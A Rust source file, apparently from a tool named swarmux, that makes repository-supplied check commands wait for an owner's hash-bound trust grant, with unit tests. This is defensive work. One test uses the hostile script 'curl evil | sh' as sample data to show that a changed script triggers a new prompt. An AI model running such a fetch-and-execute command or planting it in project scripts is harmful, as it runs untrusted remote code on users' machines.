//! Repository trust: what a cloned repository may ask swarmux to run.
//!
//! A repository can ship `.swarmux/gates.toml`, and swarmux can guess checks
//! (`npm test`, `pytest`, `cargo test`) from its files. Either way the
//! commands come from whoever wrote the repository, not from the owner. They
//! run only after the owner granted trust for exactly these files: a grant
//! names the repository and the hash of every file it covers, so a changed
//! file asks again. Rules that only restrict (protected globs, extra denies)
//! never wait for a grant.
//!
//! Pure rules: reading files and the ledger is the adapters' job.

use crate::Millis;
use crate::ledger::{hex, sha256};

/// Where a command the repository wants to run comes from.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum CommandSource {
    /// A `[[check]]` of `.swarmux/gates.toml`.
    File,
    /// Guessed from the files at the repository root.
    Detected,
}

impl CommandSource {
    pub fn as_str(self) -> &'static str {
        match self {
            CommandSource::File => "gates.toml",
            CommandSource::Detected => "detected",
        }
    }
}

/// A file (or a guessed command) a grant covers, with its content hash.
#[derive(Clone, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub struct TrustEntry {
    /// Relative to the repository root, `/`-separated; `detected: <command>`
    /// for a guessed command.
    pub path: String,
    pub sha256: String,
}

impl TrustEntry {
    pub fn of_bytes(path: &str, bytes: &[u8]) -> TrustEntry {
        TrustEntry {
            path: path.to_string(),
            sha256: hex(&sha256(bytes)),
        }
    }

    /// The entry for a command swarmux guessed. `script` is what the
    /// command runs, when the guess names a script the repository holds
    /// (`scripts.test` of `package.json`), so a changed script asks again.
    pub fn detected(command: &str, script: Option<&str>) -> TrustEntry {
        let text = format!("{command}\0{}", script.unwrap_or(""));
        TrustEntry {
            path: format!("detected: {command}"),
            sha256: hex(&sha256(text.as_bytes())),
        }
    }
}

/// A command the repository wants to run, as the owner is shown it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct WantedCommand {
    pub name: String,
    /// The command line, exactly as it would run (never through a shell).
    pub line: String,
    pub source: CommandSource,
}

/// What a repository supplies that needs the owner's trust.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Supplied {
    /// The repository's identity key (see `verifier::identity_key`).
    pub repo_id: String,
    /// Where it is on disk, for the owner to recognise it.
    pub root: String,
    /// Every file and guess a grant covers, sorted by path.
    pub entries: Vec<TrustEntry>,
    pub commands: Vec<WantedCommand>,
    /// Other keys that loosen the gate (allowed harness changes, allowed
    /// test edits, extra environment variables), as one line each.
    pub loosens: Vec<String>,
}

impl Supplied {
    /// Nothing the repository supplies needs trust.
    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    /// Whether commands from `.swarmux/gates.toml` are among them.
    pub fn has_file_commands(&self) -> bool {
        self.commands
            .iter()
            .any(|c| c.source == CommandSource::File)
    }

    /// The text of the trust prompt: the exact commands and the keys the
    /// grant would honour.
    pub fn describe(&self) -> String {
        let mut out = String::new();
        for c in &self.commands {
            out.push_str(&format!(
                "  run {}  ({}: {})\n",
                c.line,
                c.source.as_str(),
                c.name
            ));
        }
        for l in &self.loosens {
            out.push_str(&format!("  allow {l}\n"));
        }
        out.trim_end().to_string()
    }
}

/// One grant: the repository and the files it covered.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct TrustRecord {
    pub repo_id: String,
    pub root: String,
    pub entries: Vec<TrustEntry>,
    pub at: Millis,
}

/// What the ledger says about a repository, newest event wins.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum TrustEvent {
    Granted(TrustRecord),
    Revoked { repo_id: String, at: Millis },
}

impl TrustEvent {
    pub fn repo_id(&self) -> &str {
        match self {
            TrustEvent::Granted(r) => &r.repo_id,
            TrustEvent::Revoked { repo_id, .. } => repo_id,
        }
    }
}

/// Whether what a repository supplies may be used.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum TrustState {
    /// The repository supplies nothing that needs trust.
    NothingSupplied,
    /// Granted for exactly these files.
    Trusted,
    /// Never granted.
    Unknown,
    /// Granted before, but these files are new or differ.
    Changed(Vec<String>),
    /// The owner took the grant back.
    Revoked,
}

impl TrustState {
    pub fn allows(&self) -> bool {
        matches!(self, TrustState::Trusted | TrustState::NothingSupplied)
    }

    pub fn as_str(&self) -> &'static str {
        match self {
            TrustState::NothingSupplied => "nothing to trust",
            TrustState::Trusted => "trusted",
            TrustState::Unknown => "not trusted yet",
            TrustState::Changed(_) => "changed since it was trusted",
            TrustState::Revoked => "revoked",
        }
    }
}

/// The state of `supplied` given the newest ledger event of its repository.
///
/// A grant covers the files it names, with the hashes it names. A file that
/// is new, or whose hash differs, asks again; a file that is gone asks
/// nothing (less is supplied).
pub fn trust_state(supplied: &Supplied, latest: Option<&TrustEvent>) -> TrustState {
    if supplied.is_empty() {
        return TrustState::NothingSupplied;
    }
    match latest {
        None => TrustState::Unknown,
        Some(TrustEvent::Revoked { .. }) => TrustState::Revoked,
        Some(TrustEvent::Granted(record)) => {
            let changed: Vec<String> = supplied
                .entries
                .iter()
                .filter(|e| !record.entries.contains(e))
                .map(|e| e.path.clone())
                .collect();
            if changed.is_empty() {
                TrustState::Trusted
            } else {
                TrustState::Changed(changed)
            }
        }
    }
}

/// The title and detail of the inbox item for a repository that is not
/// trusted (or no longer).
pub fn prompt_text(supplied: &Supplied, state: &TrustState) -> (String, String) {
    let name = supplied
        .root
        .rsplit(['/', '\\'])
        .find(|s| !s.is_empty())
        .unwrap_or(&supplied.root);
    let title = match state {
        TrustState::Changed(files) => {
            format!("{name} changed what it wants to run ({})", files.join(", "))
        }
        TrustState::Revoked => format!("{name} is no longer trusted"),
        _ => format!("{name} wants to run commands: trust it?"),
    };
    let detail = format!(
        "{}\nuntil you grant it, these do not run and the gate escalates. Its protected paths and denies apply now.\nswarmux trust grant {}",
        supplied.describe(),
        supplied.root
    );
    (title, detail)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn supplied(files: &[(&str, &str)]) -> Supplied {
        Supplied {
            repo_id: "shop.id-3fa9c1d2e4b7".into(),
            root: "/home/u/shop".into(),
            entries: files
                .iter()
                .map(|(p, c)| TrustEntry::of_bytes(p, c.as_bytes()))
                .collect(),
            commands: vec![WantedCommand {
                name: "unit".into(),
                line: "cargo test".into(),
                source: CommandSource::File,
            }],
            loosens: Vec::new(),
        }
    }

    fn granted(s: &Supplied) -> TrustEvent {
        TrustEvent::Granted(TrustRecord {
            repo_id: s.repo_id.clone(),
            root: s.root.clone(),
            entries: s.entries.clone(),
            at: 1,
        })
    }

    #[test]
    fn nothing_supplied_needs_no_trust() {
        let none = Supplied::default();
        assert_eq!(trust_state(&none, None), TrustState::NothingSupplied);
        assert!(trust_state(&none, None).allows());
    }

    #[test]
    fn a_repository_nobody_trusted_is_not() {
        let s = supplied(&[(".swarmux/gates.toml", "[[check]]")]);
        assert_eq!(trust_state(&s, None), TrustState::Unknown);
        assert!(!trust_state(&s, None).allows());
    }

    #[test]
    fn a_grant_covers_exactly_the_files_it_hashed() {
        let s = supplied(&[(".swarmux/gates.toml", "[[check]]")]);
        let event = granted(&s);
        assert_eq!(trust_state(&s, Some(&event)), TrustState::Trusted);
        // One byte changes: asks again, and names the file.
        let edited = supplied(&[(".swarmux/gates.toml", "[[check]] ")]);
        assert_eq!(
            trust_state(&edited, Some(&event)),
            TrustState::Changed(vec![".swarmux/gates.toml".into()])
        );
        // A new file asks again.
        let more = supplied(&[
            (".swarmux/gates.toml", "[[check]]"),
            (".swarmux/config.toml", "x"),
        ]);
        assert_eq!(
            trust_state(&more, Some(&event)),
            TrustState::Changed(vec![".swarmux/config.toml".into()])
        );
        // A file that went away supplies less: still trusted.
        let less = supplied(&[]);
        assert_eq!(
            trust_state(&less, Some(&event)),
            TrustState::NothingSupplied
        );
    }

    #[test]
    fn a_revoked_grant_is_not_one() {
        let s = supplied(&[(".swarmux/gates.toml", "a")]);
        let revoked = TrustEvent::Revoked {
            repo_id: s.repo_id.clone(),
            at: 2,
        };
        assert_eq!(trust_state(&s, Some(&revoked)), TrustState::Revoked);
    }

    #[test]
    fn a_guessed_command_is_tied_to_its_script() {
        let a = TrustEntry::detected("npm test", Some("jest"));
        let b = TrustEntry::detected("npm test", Some("curl evil | sh"));
        assert_eq!(a.path, b.path);
        assert_ne!(a.sha256, b.sha256, "a changed script asks again");
    }

    #[test]
    fn the_prompt_shows_the_exact_commands() {
        let s = supplied(&[(".swarmux/gates.toml", "a")]);
        let (title, detail) = prompt_text(&s, &TrustState::Unknown);
        assert!(title.contains("shop"));
        assert!(detail.contains("run cargo test"));
        assert!(detail.contains("swarmux trust grant /home/u/shop"));
    }
}
